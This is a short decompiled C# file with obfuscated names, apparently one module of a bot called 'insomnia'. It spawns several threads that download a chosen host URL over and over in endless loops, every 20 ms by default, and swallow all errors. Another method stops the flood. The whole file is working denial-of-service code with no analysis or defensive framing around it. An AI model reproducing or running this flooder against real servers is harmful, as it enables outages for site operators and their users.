using System.Net;
using System.Threading;

namespace insomnia;

internal class Class15
{
	private class Class16
	{
		private string Field3;

		private WebClient Field2 = new WebClient();

		private int Field1;

		public Class16(string Host, int Interval)
		{
			Field3 = Host;
			Field1 = Interval;
		}

		public void Method1()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						Field2.DownloadString(Field3);
						Thread.Sleep(Field1);
					}
				}
				catch
				{
					Thread.Sleep(Field1);
				}
			}
		}
	}

	private static ThreadStart[] Field7;

	private static Thread[] Field6;

	public static string Field5;

	public static int Field4 = 20;

	public static bool Field3 = false;

	private static Class16[] Field2;

	public static int Field1 = 2;

	public static void Method2()
	{
		Field6 = new Thread[Field1];
		Field7 = new ThreadStart[Field1];
		Field2 = new Class16[Field1];
		for (int i = 0; i < Field1; i++)
		{
			Field2[i] = new Class16(Field5, Field4);
			Field7[i] = Field2[i].Method1;
			Field6[i] = new Thread(Field7[i]);
			Field6[i].Start();
		}
		Field3 = true;
	}

	public static void Method1()
	{
		for (int i = 0; i < Field1; i++)
		{
			try
			{
				Field6[i].Suspend();
				Field6[i] = null;
				Field7[i] = null;
				Field2[i] = null;
			}
			catch
			{
			}
		}
		Field3 = false;
	}
}
